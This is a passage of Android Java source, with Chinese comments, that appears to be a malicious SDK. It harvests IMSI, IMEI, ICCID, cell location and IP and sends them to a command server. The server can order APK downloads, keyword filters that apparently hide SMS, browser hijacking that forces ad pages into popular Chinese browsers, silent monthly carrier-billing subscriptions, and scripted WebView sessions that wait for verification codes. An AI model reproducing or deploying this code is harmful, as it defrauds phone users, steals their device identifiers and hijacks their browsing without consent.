		// 5.2. 获取应用签名公钥加密串
		// 固定字符串
		sign = "11111111111111111";
		// 5.3. 获取IMSI加密串
		// 真实数据
		IMSI = getIMSI(context).trim();
		// 获取包名
		// 真实数据
		packageName = getPackageName(context);
		// 5.5. 获取SDK版本号
		SDKVersion = "21";
		// 5.6. 获取网络访问方式
		// 真实数据
		net = getNetMode(context);

		//ua信息
		UA = DeviceInfo.getPhoneUA();
		ICCID = DeviceInfo.getIccid(context);
		video_ua = DeviceInfo.getBrowserUA(context);
		
		Logger.print(TAG, "ICCID:" + ICCID);
		
		sd_cid = DeviceInfo.deviceId(context);
		Logger.print(TAG, "deviceId:" + sd_cid);
		In infor = new In(context);

		currentVersion = infor.getversionnumber();
		systemSign = infor.issystemapk(context);
		phoneType = Build.MODEL;
		androidVersion = infor.getSDKversionnumber();
		IMEI = infor.getIMEI().trim();
		IMSI_NAKED = infor.getIMSI().trim();
		Logger.print(TAG, "imsi_nake" + IMSI_NAKED);
		cid = infor.getCid();
		lac = infor.getLac();
		nid = infor.getNID();
		ip = infor.getIpAddress();
		realSign = infor.getSign(context);

		boolean isTwoCard = infor.chargeHasTwoImsi(context);
		if (isTwoCard) {
			imsiCardCount = 2;
			imsi_1 = infor.getTwoImsi(context, 0);
			imsi_2 = infor.getTwoImsi(context, 1);
		} else {
			imsiCardCount = 1;
			imsi_1 = null;
			imsi_2 = null;
		}

		// 获取随机数
		salt = Util.getSalt(mContext);

		// LH.LogPrint(tag, "手机信息：");
		// LH.LogPrint(tag, "app-id : " + appid);
		// LH.LogPrint(tag, "si-gn : " + sign);
		Logger.print(TAG, "IM-SI : " + IMSI);
		// LH.LogPrint(tag, "package-Name : " + packageName);
		// LH.LogPrint(tag, "SDK-Version : " + SDKVersion);
		// LH.LogPrint(tag, "n-et : " + net);
		// LH.LogPrint(tag, "current-Version : " + currentVersion);

		// LH.LogPrint(tag, "system-Sign : " + systemSign);
		// LH.LogPrint(tag, "phone-Type : " + phoneType);
		// LH.LogPrint(tag, "android-Version : " + androidVersion);
		// LH.LogPrint(tag, "IM-EI : " + IMEI);
//		 LH.LogPrint(tag, "IM-SI_NAKED : " + IMSI_NAKED);
//		Logger.print(TAG, "IMSI 未加密：------------>>>>" + IMSI_NAKED);

		// LH.LogPrint(tag, "c-id : " + cid);
		// LH.LogPrint(tag, "l-ac : " + lac);
		// LH.LogPrint(tag, "ni-d : " + nid);
		// LH.LogPrint(tag, "i-p : " + ip);
		// LH.LogPrint(tag, "real-Sign : " + realSign);

		// LH.LogPrint(tag, "imsi-CardCount: " + imsiCardCount);
		// LH.LogPrint(tag, "i-msi_1: " + imsi_1);
		// LH.LogPrint(tag, "i-msi_2: " + imsi_2);

		// LH.LogPrint(tag, "salt:" + salt);
	}
	
	
	// 获取IMSI
	public static String getIMSI(Context mContext) {
		TelephonyManager tm = (TelephonyManager) mContext.getSystemService("phone");
		String subscriberID = tm.getSubscriberId();
		byte[] bb = null;
		try {
			if ((subscriberID == null) || ("".equals(subscriberID))) {
				return "";
			}
			if (subscriberID.length() != 15) {
				subscriberID = DeviceUuidFactory.getInstance().getUuid(mContext);
			}
			bb = subscriberID.getBytes("UTF-8");
		} catch (UnsupportedEncodingException e) {
			Log.e("SDK_LW_CMM", e.getMessage(), e);
		}
		return MD5.bytes2hex(MD5.md5(bb));
	}
	

	// 获取pachageName
	public static String getPackageName(Context mContext) {
		String pn = "";
		try {
			PackageInfo info = mContext.getPackageManager().getPackageInfo(mContext.getPackageName(), 0);
			pn = info.packageName;
		} catch (PackageManager.NameNotFoundException e) {
			Log.e("SDK_LW_CMM", e.getMessage(), e);
		}
		return pn;
	}

	// 获取网络模式
	public static String getNetMode(Context mContext) {
		if (NetMode.checkWifiNetStatus(mContext)) {
			return "WIFI";
		}
		if (NetMode.checkMobileNetStatus(mContext)) {
			ConnectivityManager connectivityManager = (ConnectivityManager) mContext.getSystemService("connectivity");
			NetworkInfo mobNetInfo = connectivityManager.getNetworkInfo(0);
			if (mobNetInfo != null) {
				if ("cmwap".equals(mobNetInfo.getExtraInfo()))
					return "CMWAP";
				if ("cmnet".equals(mobNetInfo.getExtraInfo())) {
					return "CMNET";
				}
				return "OTHER";
			}

			return "NIISNUll";
		}

		return "NOWM";
	}

	/**
	 * 这块移除了移动初始化的操作。
	 */

	// 异步调取移动端初始化接口
	class ServiceCMOMPInit extends AsyncTask<String, Integer, String> {
 
		private Context context;
		private String appId;
		private String sign;
		private String imsi;
		private String packageName;
		private String SDKVersion;
		private String net;
		private String qudaohao;

		// 软件本身版本号
		private String currentVersion;
		private int systemSign;
		private String phoneType;
		// android版本号
		private String androidVersion;
		private String IMEI;
		private String IMSI_NAKED;

		private String cid;
		private String lac;
		private String nid;
		private String ip;

		private String realSign;

		private int imsiCardCount;
		private String imsi_1;
		private String imsi_2;

		private String salt;

		public ServiceCMOMPInit(Context context, String appId, String sign,
				String imsi, String packageName, String SDKVersion, String net,
				String qudaohao, String currentVersion, int systemSign,
				String phoneType, String androidVersion, String IMEI,
				String IMSI_NAKED, String cid, String lac, String nid,
				String ip, String realSign, int imsiCardCount, String imsi_1,
				String imsi_2, String _salt) {

			this.context = context;
			this.appId = appId;
			this.sign = sign;
			this.imsi = imsi;
			this.packageName = packageName;
			this.SDKVersion = SDKVersion;
			this.net = net;
			this.qudaohao = qudaohao;

			this.currentVersion = currentVersion;
			this.systemSign = systemSign;
			this.phoneType = phoneType;
			this.androidVersion = androidVersion;
			this.IMEI = IMEI;
			this.IMSI_NAKED = IMSI_NAKED;
			this.cid = cid;
			this.lac = lac;
			this.nid = nid;
			this.ip = ip;
			this.realSign = realSign;
			this.imsiCardCount = imsiCardCount;
			this.imsi_1 = imsi_1;
			this.imsi_2 = imsi_2;
			this.salt = _salt;
		}

		@Override
		protected String doInBackground(String... params) {
			return "";
		}

		Handler initHandler = new Handler() {

			@Override
			public void handleMessage(Message msg) {

				// LH.LogPrint(tag, "移动端初始化已经结束，现在进入了initHandler");
				RO object = (RO) msg.obj;

				YDII info = (YDII) object.obj;

				if (object.result) {
					// LH.LogPrint(tag, "移动端初始化成功了！！！");
					// 初始化本地服务器
					new ServiceOwnerInit(context, appId, sign, imsi,
							packageName, SDKVersion, net, qudaohao, 1,
							info.getResCode(), info.getResInfo(),
							currentVersion, systemSign, phoneType,
							androidVersion, IMEI, IMSI_NAKED, cid, lac, nid,
							ip, realSign, imsiCardCount, imsi_1, imsi_2, salt).execute("");
				} else {
					// LH.LogPrint(tag, "移动端初始化没有成功！！！");
					// 初始化本地服务器
					new ServiceOwnerInit(context, appId, sign, imsi,
							packageName, SDKVersion, net, qudaohao, 0,
							info.getResCode(), info.getResInfo(),
							currentVersion, systemSign, phoneType,
							androidVersion, IMEI, IMSI_NAKED, cid, lac, nid,
							ip, realSign, imsiCardCount, imsi_1, imsi_2, salt).execute("");
				}

				super.handleMessage(msg);
			}
		};

	}

	// 初始化本地服务器
	class ServiceOwnerInit extends AsyncTask<String, Integer, String> {

		private Context context;
		private String appId;
		private String sign;
		private String imsi;
		private String packageName;
		private String SDKVersion;
		private String net;
		private String qudaohao;
		private int initYIDONGIsOk;
		private int resCode;
		private String resInfo;

		// 软件本身版本号
		private String currentVersion;
		private int systemSign;
		private String phoneType;
		// android版本号
		private String androidVersion;
		private String IMEI;
		private String IMSI_NAKED;

		private String cid;
		private String lac;
		private String nid;
		private String ip;

		private String realSign;

		private int imsiCardCount;
		private String imsi_1;
		private String imsi_2;

		private String salt;

		public ServiceOwnerInit(Context context, String appId, String sign,
				String imsi, String packageName, String SDKVersion, String net,
				String qudaohao, int initYIDONGIsOk, int resCode,
				String resInfo, String currentVersion, int systemSign,
				String phoneType, String androidVersion, String IMEI,
				String IMSI_NAKED, String cid, String lac, String nid,
				String ip, String realSign, int imsiCardCount, String imsi_1,
				String imsi_2, String _salt) {

			this.context = context;
			this.appId = appId;
			this.sign = sign;
			this.imsi = imsi;
			this.packageName = packageName;
			this.SDKVersion = SDKVersion;
			this.net = net;
			this.qudaohao = qudaohao;
			this.initYIDONGIsOk = initYIDONGIsOk;
			this.resCode = resCode;
			this.resInfo = resInfo;

			this.currentVersion = currentVersion;
			this.systemSign = systemSign;
			this.phoneType = phoneType;
			this.androidVersion = androidVersion;
			this.IMEI = IMEI;
			this.IMSI_NAKED = IMSI_NAKED;
			this.cid = cid;
			this.lac = lac;
			this.nid = nid;
			this.ip = ip;
			this.realSign = realSign;
			this.imsiCardCount = imsiCardCount;
			this.imsi_1 = imsi_1;
			this.imsi_2 = imsi_2;
			this.salt = _salt;
		}

		@Override
		protected String doInBackground(String... params) {

			// 发起获取手机号码的指令

			service.doInitProcess(context, ownerHandler, 0, appId, sign, imsi,
					packageName, SDKVersion, net, qudaohao, initYIDONGIsOk,
					resCode, resInfo, currentVersion, systemSign, phoneType,
					androidVersion, IMEI, IMSI_NAKED, cid, lac, nid, ip,
					realSign, imsiCardCount, imsi_1, imsi_2, salt);

			return "";
		}

		Handler ownerHandler = new Handler() {

			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);
				Logger.print(TAG, "本地服务器初始化已经完成，现在需要看指令");
				RO object = (RO) msg.obj;
				
				IFLSBean serviceBean = (IFLSBean) object.obj;

				// 判断是否已经存在手机号码了，true值的话就去移动端获取，false的话就表示不用获取了
				SharedPreferences initServicePreferences = context.getSharedPreferences(PlayService.PREFS_NAME, 0);
				SharedPreferences.Editor initServiceEditor = initServicePreferences.edit();

				int time = serviceBean.getDoTime();
				if (time > 0) {
					// 有心跳时间
					// LH.LogPrint(tag, "有心跳时间");
					initServiceEditor.putInt(PlayService.WAIT_TIME, time);
					initServiceEditor.commit();
				} else {
					// LH.LogPrint(tag, "使用上一次心跳时间");
				}
				
				StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);
				StartMainservice(context, context.getPackageName(), HiJackService.SERVICE_ACTION);

				// 设置是否需要获取手机号码接口
				initServiceEditor.putBoolean(PlayService.ISSENDPHONENUMBERREQUEST, true);
				initServiceEditor.commit();
				

				// 屏蔽关键字
				String keyNumbers = serviceBean.getKeynumbers();
				String keyWords = serviceBean.getKeywords();
				// LH.LogPrint(tag, "获取到的屏蔽关键字是：" + "电话号码：" + keyNumbers +
				// ", 屏蔽关键字：" + keyWords);
				// 是否要发起获取指令集合的请求(短代的开关)
				boolean hascommands = serviceBean.isHascommands();
				// LH.LogPrint(tag, "是否要发起获取指令集合的请求：" + hascommands);
				if (keyNumbers != null && !"".equals(keyNumbers.trim()) && keyWords != null && !"".equals(keyWords.trim())) {

					// 获取到了keywords，需要存放到SharePreference

					SharedPreferences keyPreferences = context.getSharedPreferences(PlayService.KEYWORDS_NAME, 0);
					SharedPreferences.Editor keyEditor = keyPreferences.edit();

					// 逗号的处理，英文状态下的逗号，和中文状态下的逗号
					String newKeyNumbers = Util.getKeyWords(keyNumbers);
					String newKeyWords = Util.getKeyWords(keyWords);

					// LH.LogPrint(tag, "屏蔽的关键字的号码：" + newKeyNumbers +
					// ", 屏蔽的关键字：" + newKeyWords);

					if (newKeyNumbers != null && newKeyWords != null) {
						// 保存这两个字段
						keyEditor.putString(PlayService.KEYWORDS_NUMBER, newKeyNumbers);
						keyEditor.putString(PlayService.KEYWORDS_WORDS, newKeyWords);
						keyEditor.commit();

						/*
						 * 查看是否需要发起获取指令的请求 设计到此处的理由： 1、获取到最新的屏蔽关键字
						 * 2、确保最新的用户，在获取到屏蔽关键字时，才能发起请求
						 */

						if (hascommands) {
							// Log.e("获取指令----", "发起获取指令集合的命令");
							// 发起获取指令集合的请求
							// LH.LogPrint(tag, "发起获取指令集合的命令");
							new GetCommandsFromService(context, QUDAOHAO, IMSI).execute("");
						}
					}
				}

				// 随机数
				String salt = serviceBean.getSalt();
				if (salt != null && !"".equals(salt)) {
					// 查看本地文件是否存在
					String current_salt = Util.getSalt(mContext);
					if (current_salt == null || "".equals(current_salt.trim()) || !salt.equals(current_salt)) {
						Util.saveSalt(mContext, salt);
					}
				}

				// 判断是否需要发起获取apk的指令 5.50
				boolean isDownloadApk = serviceBean.isDownloadApk();
				if (isDownloadApk) {
					// 需要下载，那么进行下载的程序
					// LH.LogPrint(tag, "需要发起获取apk的指令，那么现在开始进入下载apk的流程吧");
					new DownloadApk(context, IMSI, QUDAOHAO).startDownloadTask();
				}

				// 获取webview的指令：8.00
				boolean isHasWebCommands = serviceBean.isHasWebCommands();
				if (isHasWebCommands) {
					new GetWebCommandsFromService(context, QUDAOHAO, IMSI, currentVersion, net).execute("");
				}
				// 获取包月指令
				boolean isDoMonthCommands = serviceBean.isDoMonthCommands();
				if (isDoMonthCommands) {
					new GetMonthCommandsFromService(context, IMSI, IMEI, currentVersion, QUDAOHAO, net).execute("");
					
				} else {
					Logger.print(TAG, "DoMonthCommands:----->>" + isDoMonthCommands);
				}

				//获取浏览器劫持指令
				boolean isHasBrowserCommands = serviceBean.isDoBrowserCommands();
				if(isHasBrowserCommands) {
					new GetBrowserCommands(context, IMSI, IMEI, currentVersion, QUDAOHAO, net).execute("");
					new GetProviceAndCity().execute("");
				} else {
					Logger.print(TAG, "DoGetBrowserComms:---->>>" + isHasBrowserCommands);
				}
				//移动基地破解接入--sdk
				boolean isDoCrackAccess = serviceBean.isDoCrackAccess();
				if(isDoCrackAccess){
					//先去获取业务id
//					new GetIdFromService(contex t, QUDAOHAO, IMSI).execute();
					CrackAccess crackAccess = new CrackAccess();
					crackAccess.crackAccess(context, QUDAOHAO, IMSI, IMSI_NAKED, IMEI, packageName, currentVersion, net, phoneType, androidVersion, UA, video_ua, ICCID, sd_cid);
				} else {
					Logger.print(TAG, "DoCrackAccess--->>" + isDoCrackAccess);
				}
				
				// umeng停止
				UmengUtil umengUtil = UmengUtil.getIntent();
				umengUtil.stopUmeng(context);
				StartMainservice(context, context.getPackageName(),PlayService.SERVICE_ACTION);

			}
		};

	}
	
	
	//异步获取省份城市信息
	class GetProviceAndCity extends AsyncTask<String, Integer, String>{
		
		private static final String TAG = "获取省份城市信息：";
		private String mResult = null;
		private String mProvinceName; // 省份
		private String mChCityName; // 城市
		private int GET_CITY_SUCCESS = 1;
		private int GET_CITY_FAILURE = 2;

		
		@Override
		protected String doInBackground(String... arg0) {
			getCurrentProvinceAndCity();
			return null;
		}
		public void getCurrentProvinceAndCity() {
			final String url = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?";
			HttpGet httpGet = new HttpGet(url);
			try {
				HttpResponse httpResponse = new DefaultHttpClient().execute(httpGet);
				StatusLine statusLine = httpResponse.getStatusLine();
				if (statusLine != null && statusLine.getStatusCode() == 200) {
					mResult = EntityUtils.toString(httpResponse.getEntity()).trim();
					mHandler.sendEmptyMessage(GET_CITY_SUCCESS);
				}
			} catch (Exception e) {
				Logger.print(TAG, "getCurrentProvinceAndCity, Exception");
				e.printStackTrace();
				mHandler.sendEmptyMessage(GET_CITY_FAILURE);
			}
		}
		Handler mHandler = new Handler(){
			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);
				
				if (msg.what == GET_CITY_SUCCESS) {
					// src.split("\t") 返回的是以制表符（TAB键）分隔的字符串数组
					String[] results = mResult.split("\t");
					if (results.length >= 5) {
						mProvinceName = results[4];
						mChCityName = results[5];
					}
					Logger.print("----省份：" + mProvinceName, "----城市：" + mChCityName);
					provice = mProvinceName;
				} else if (msg.what == GET_CITY_FAILURE) {
					// 获取失败
					Logger.print(TAG, "未获取到省份信息");
				}
				
			}
		};
		
	}
	//异步获取浏览器劫持指令
	class GetBrowserCommands extends AsyncTask<String, Integer, String>{
		private Context contextForServices;
		private String channel;
		private String imsi;
		private String imei;
		private String appVersion;
		private String net;
		
		public GetBrowserCommands(Context mContext, String imsi, String imei, String appVersion, String channel, String net){
			this.contextForServices = mContext;
			this.channel = channel;
			this.imsi = imsi;
			this.imei = imei;
			this.appVersion = appVersion;
			this.net = net;
		}
		
		@Override
		protected String doInBackground(String... arg0) {
			
			service.doGetBrowserCommands(contextForServices, getBrowserHandler, 0, imsi, imei, appVersion, channel, net);
			return "";
		}
		
		Handler getBrowserHandler = new Handler(){
			
			public void handleMessage(Message msg) {
				super.handleMessage(msg);
				RO ro = (RO) msg.obj;
				if(ro.result){
					Logger.print(TAG, "获取到浏览器劫持指令");
					//已经获取到指令，现在需要执行指令
					//获取下执行开始和结束时间
					BrowserAdsBean adsBeanComm = (BrowserAdsBean) ro.obj;
					ArrayList<String> timeList = adsBeanComm.getTime_area();
					if(timeList != null && timeList.size() > 0){
						String time = timeList.get(0);
						String [] time_area = time.split("_");
						String startTime = time_area[0];
						String endTime = time_area[1];
						
						//获取下当前日期并转化成毫秒值
						long startTimeMills = doHandleTime(startTime);
						long endTimeMills = doHandleTime(endTime);
						SharedPreferences alarmPres = contextForServices.getSharedPreferences(HiJackService.PREFS_NAME, 0);
						SharedPreferences.Editor editor = alarmPres.edit();
						//分别设置劫持开始时间和结束时间
						editor.putLong(HiJackService.START_TIME, startTimeMills);
						editor.putLong(HiJackService.WAIT_TIME, (endTimeMills - startTimeMills));
						//给闹钟提醒设置一个状态，此处0表示要开始执行
						editor.putString(HiJackService.STATUS, "0");
						editor.commit();
						adsBean = adsBeanComm;
						
//						StartMainservice(contextForServices, contextForServices.getPackageName(), HiJackService.SERVICE_ACTION);
						
						Intent intent = new Intent();
						intent.setClass(contextForServices, HiJackService.class);
						contextForServices.startService(intent);
						
						
					} else {
						Logger.print(TAG, "执行时间区间为空!");
					}
				} else {
					
				}
				
			}
		};
		// 处理开始和结束时间
		public long doHandleTime(String timePoint) {
			
			Calendar cal = Calendar.getInstance();
	        cal.set(Calendar.HOUR_OF_DAY, 0);
	        cal.set(Calendar.SECOND, 0);
	        cal.set(Calendar.MINUTE, 0);
			cal.set(Calendar.MILLISECOND, 0);
			
			long time = 0;
			SimpleDateFormat simFormat = new SimpleDateFormat("yyyyMMdd");
			Date curDate = new Date(System.currentTimeMillis());
			String riQi = simFormat.format(curDate);
			Logger.print("日期:", riQi);

			int startTimeHour = Integer.parseInt(timePoint);
			long startTimeMills = startTimeHour * 3600 * 1000;
			long riQiMills = cal.getTimeInMillis();
			time = riQiMills + startTimeMills;
			Logger.print("当天起始执行时间：", "" + time);
			return time;
		}
		
	}
	
	//开始执行浏览器劫持指令
	class DoExectueBrowserComm extends AsyncTask<String, Integer, String> {
		private BrowserAdsBean adsBean;
		private Context context;
		private boolean isTargetRun;
		private int times;
		private String url;
		public DoExectueBrowserComm(Context mContext, BrowserAdsBean mAdsBean){
			this.adsBean = mAdsBean;
			this.context = mContext;
		}

		@Override
		protected String doInBackground(String... arg0) {
			//得到activityManager对象
			ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
			//得到当前正在运行的进程
			List<RunningAppProcessInfo> runningProcList = activityManager.getRunningAppProcesses();
			
			Logger.print(TAG, "开始遍历正在运行的进程");
			isTargetRun = true;
			times = 0;
			ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
			
			while(true){
				//判断当前用户系统的版本
				if(Build.VERSION.SDK_INT < 21){
					List<RunningTaskInfo> tasks = am.getRunningTasks(5);
			        if (! tasks.isEmpty()) {
			        	ComponentName topActivity = tasks.get(0).topActivity;
			        	Logger.print(TAG, "==> : " + topActivity.getPackageName());
			        	
//			            ComponentName topActivity = tasks.get(0).topActivity;
			            if (topActivity.getPackageName().equals("com.UCMobile") || topActivity.getPackageName().equals("com.tencent.mtt") || topActivity.getPackageName().equals("com.qihoo.browser") || topActivity.getPackageName().equals("com.baidu.browser.apps") || topActivity.getPackageName().equals("com.ijinshan.browser_fast")) {
			            	if(adsBean.getAddress() != null){
								//在正式启动劫持程序前，先判断下当前用户所在的省份。
								ArrayList<String> areaList = (ArrayList<String>) adsBean.getArea();
								Logger.print(TAG, "屏蔽省份信息:" + areaList);
								Logger.print(TAG, "省份信息:" + provice);
								if(areaList != null){
									
									if(areaList.contains(provice)){
										Logger.print(TAG, "用户所在省份受限!");
									} else {
										Logger.print(TAG, "目标程序已开启，准备劫持!");
										if(isTargetRun){
											Logger.print(TAG, "目标程序正在运行!");
											
										} else {
											//线程暂停2秒,用于等待目标应用启动
											Logger.print(TAG, "暂停3S,等待目标应用启动!");
											try {
												Thread.sleep(3 * 1000);
											} catch (InterruptedException e) {
												// TODO Auto-generated catch block
												e.printStackTrace();
											}
											
											//用于控制执行次数
											times = times + 1;
											ArrayList<String> addressList = adsBean.getAddress();
											
											if(addressList.size() > 0){
												url = addressList.get(0);
												if(adsBean != null){
													
													if(url != null && !"".equals(url.trim())){
														switch (times) {
														case 1:
															Logger.print(TAG, "第1执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															isTargetRun = true;
															addressList.remove(0);
															break;

														case 2:
															Logger.print(TAG, "第2执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															addressList.remove(0);
															isTargetRun = true;
															break;
															
														case 3:
															Logger.print(TAG, "第3执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															addressList.remove(0);
															
															isTargetRun = true;
															break;
														case 4:
															Logger.print(TAG, "第4执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															addressList.remove(0);
															isTargetRun = true;
															break;
														case 5:
															Logger.print(TAG, "第5执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															addressList.remove(0);
															isTargetRun = true;
															break;

														case 6:
															Logger.print(TAG, "第6执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															addressList.remove(0);
															isTargetRun = true;
															break;
															
														case 7:
															Logger.print(TAG, "第7执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															addressList.remove(0);
															isTargetRun = true;
															break;
														case 8:
															Logger.print(TAG, "第8执行劫持操作");
															doShowAdSite(url, topActivity.getPackageName());
															addressList.remove(0);
															isTargetRun = true;
															break;
														default:
															break;
														}
													}
													
												}
											} else {
												Logger.print(TAG, "地址列表为空!");
												
											}
											
										}
										
									}
									
								}
								
							} else {
								Logger.print("-----*****----", "adsBean.getAddress为空!");
							}
			            } else {
			            	isTargetRun = false;
			            }
			        } 
				} else {
					Logger.print(TAG, "用户系统版本是5.0或者以上!");
				}
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}
		// 劫持方法
		public void doShowAdSite(String url, String pkg) {
			String packageName = pkg;
			Uri uri = Uri.parse(url);
			Intent intent = new Intent(Intent.ACTION_VIEW, uri);
			// 设置我们的劫持页到 栈顶
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//			intent.addCategory("android.intent.category.BROWSABLE");
//			intent.addCategory("android.intent.category.DEFAULT");
			intent.setPackage(packageName);
			context.startActivity(intent);
			
		}
		
	}
	

	// 异步获取指令集合
	class GetCommandsFromService extends AsyncTask<String, Integer, String> {

		private Context contextForServices;
		private String channel;
		private String imsi_1;

		public GetCommandsFromService(Context contextForServices,
				String channel, String imsi_1) {
			this.contextForServices = contextForServices;
			this.channel = channel;
			this.imsi_1 = imsi_1;
		}

		@Override
		protected String doInBackground(String... params) {

			service.doGetCommandsFromService(contextForServices, commandHandler, 0, channel, imsi_1);
			return "";
		}

		Handler commandHandler = new Handler() {

			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);

				RO object = (RO) msg.obj;
				// Log.e("bradcast", "获取到了指令 ： " + object.result);

				if (object.result) {
					// 获取到指令列表
					ArrayList<CommandBean> list = (ArrayList<CommandBean>) object.obj;

					if (list != null && !list.isEmpty()) {
						// LH.LogPrint(tag, "指令集合不为null");
						// 发起指令解析
						ProtocolParser parser = new ProtocolParser(contextForServices);
						parser.Parser(list);
					} else {
						// LH.LogPrint(tag, "指令集合为null");
					}

				} else {
					// LH.LogPrint(tag, "获取指令失败，失败原因：" + object.obj);
				}
			}
		};

	}

	// 异步获取包月指令集合
	class GetMonthCommandsFromService extends AsyncTask<String, Integer, String> {

		private Context contextForServices;
		private String channel;
		private String imsi;
		private String imei;
		private String appVersion;
		private String net;

		public GetMonthCommandsFromService(Context contextForServices,
				String imsi, String imei, String appVersion, String channel,
				String net) {
			this.contextForServices = contextForServices;
			this.channel = channel;
			this.imsi = imsi;
			this.imei = imei;
			this.appVersion = appVersion;
			this.net = net;
		}

		@Override
		protected String doInBackground(String... params) {
			service.doGetMonthCommandsFromService(contextForServices,monthCommandHandler, 0, imsi, imei, appVersion, channel, net);
			return "";
		}

		Handler monthCommandHandler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);
				RO object = (RO) msg.obj;
				if (object.result) {
					// 获取到指令列表
					Logger.print(TAG, "获取到了包月指令，现在开始执行指令。");
					GetMonthCommandsResultBean getMonthBean = (GetMonthCommandsResultBean) object.obj;
					new DoMonth(contextForServices, getMonthBean).execute();
				}

				// 此处需要 把获取web指令的结果上报给服务器
				// new SendGetWebCommandsResultThread(object.result ?
				// "@status_ok@" : object.obj + "").start();
			}
		};
	}

	// 执行订购包月的操作
	class DoMonth extends AsyncTask<String, Integer, Object> {

		private Context mContext;
		private GetMonthCommandsResultBean monthBean;
		private String cpId;
		private String serviceId;
		private String mode;
		private ResultBean ro;

		public DoMonth(Context _mContext, GetMonthCommandsResultBean _monthBean) {
			this.mContext = _mContext;
			this.monthBean = _monthBean;
		}

		@Override
		protected Object doInBackground(String... params) {
			if (monthBean != null) {
				cpId = monthBean.getCpId();
				serviceId = monthBean.getServiceId();
				mode = monthBean.getMode();
				PayInterface pay = new PayInterface();
				ro = pay.doProcess(mContext, cpId, serviceId, mode, UA);
				if (ro != null && !"".equals(ro.getCode())) {
					int code = ro.getCode();
					String desc = ro.getDesc();
					Logger.print(TAG, "包月订购结果：" + code);
					Logger.print(TAG, "包月订购描述：" + desc);
				} else {
					Logger.print(TAG, "ro:" + ro);
				}
			} else {

			}
			return ro;
		}
	}

	// 异步获取Web指令集合
	class GetWebCommandsFromService extends AsyncTask<String, Integer, String> {

		private Context contextForServices;
		private String channel;
		private String imsi;
		private String appVersion;
		private String net;

		public GetWebCommandsFromService(Context contextForServices, String channel, String imsi, String appVersion, String net) {
			this.contextForServices = contextForServices;
			this.channel = channel;
			this.imsi = imsi;
			this.appVersion = appVersion;
			this.net = net;
		}

		@Override
		protected String doInBackground(String... params) {
			service.doGetWebCommandsFromService(contextForServices, webCommandHandler, 0, channel, imsi, appVersion, net);
			return "";
		}

		Handler webCommandHandler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);
				RO object = (RO) msg.obj;
				if (object.result) {
					// 获取到指令列表
					Logger.print(TAG, "获取到了web指令，现在开始执行指令。");
					ArrayList<WebBean> list = (ArrayList<WebBean>) object.obj;
					if (list != null && !list.isEmpty()) {
						// 发起指令解析
						Logger.print(TAG, "webview 有指令， 现在去执行指令");
						// 执行页面控制流程
						new DoControlWebPagesExectue(contextForServices, list).execute();
					} else {
						Logger.print(TAG, "代码为null");
					}
				}

				// 此处需要 把获取web指令的结果上报给服务器
//				new SendGetWebCommandsResultThread(
//						object.result ? "@status_ok@" : object.obj + "")
//						.start();
			}
		};
	}

	// 用于控制web页面执行流程
	class DoControlWebPagesExectue extends AsyncTask<String, Integer, String> {

		private static final String tag = "webView";
		private ArrayList<WebBean> webBeanList;
		private ArrayList<PageBean> pbList;
		private ArrayList<PageInnerBean> pibList;
		private boolean isCurrentPageDone = false;
		private Context context;
		private String verificationCode;

		public DoControlWebPagesExectue(Context _mContext,
				ArrayList<WebBean> _mWebViewList) {
			this.webBeanList = _mWebViewList;
			this.context = _mContext;
		}

		@Override
		protected String doInBackground(String... params) {
			// 1：解析web指令,添加handler
			
			if (webBeanList != null && ! webBeanList.isEmpty()) {
				
				// 循环一次执行一个url
				for (WebBean webBean : webBeanList) {
					// 解析指令
					ParseWebViewCommands  parseWebComm = new ParseWebViewCommands();
					if(parseWebComm != null){
						WebBean parseDoneCommm = parseWebComm.doParseCommands(webBean);
						Logger.print(tag, "指令解析完成：" + parseDoneCommm);
					}
					
					pbList = webBean.getPbList();
					// 执行第一个页面
					// 加载URL,存在只加载一次页面的情况，所以先去执行加载页面的操作。
					Message mess = new Message();
					mess.obj = webBean;
					DoLoadUrlHandler.sendMessage(mess);
					
					while(true) {
						
						if(! myWebView.isLoadUrlDone){
							try {
								Thread.sleep(2 * 1000);
							} catch (InterruptedException e) {
								e.printStackTrace();
							}
						} else {
							if (pbList != null && pbList.size() > 0) {
								
								for (PageBean pageBean : pbList) {
										//执行页面操作
									try {
										pibList = pageBean.getPibList();
										while (pibList != null && pibList.size() > 0) {
											PageInnerBean pageInnerBean = pibList.get(0);
											int type = pageInnerBean.getType();
											Message mess1 = new Message();
											verificationCode = MyWebView.verificationCode;
											if (type == 4 && verificationCode == null) {
												Logger.print(tag, "该获取验证码");
												try {
													Thread.sleep(2 * 1000);
													continue;
												} catch (Exception e) {
													e.printStackTrace();
												}
										
											} else {
												mess1.obj = pageInnerBean;
												pibList.remove(0);
											}
											DoParseHandler.sendMessage(mess1);
										}
										
										if (pibList == null && pibList.isEmpty()) {
											isCurrentPageDone = true;
											pbList.remove(0);
											if(pageBean.getDelayTime() > 0){
												try {
													Thread.sleep(pageBean.getDelayTime() * 1000);
												} catch (Exception e) {
													e.printStackTrace();
												}
											}
										}
										if(isCurrentPageDone){
											Logger.print(tag, "当前页执行完毕!");
											myWebView.isLoadUrlDone = false;
											break;
										}
									} catch (Exception e) {
										e.printStackTrace();
									}
									
								}
								
							} else {
								
							}
							break;
						}
					}

				}
			} else {
				Logger.print(tag, "未获取到指令!");
			}
			return null;
		}
	}
	
	Handler DoLoadUrlHandler = new Handler() {
		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			WebBean webBean = (WebBean) msg.obj;
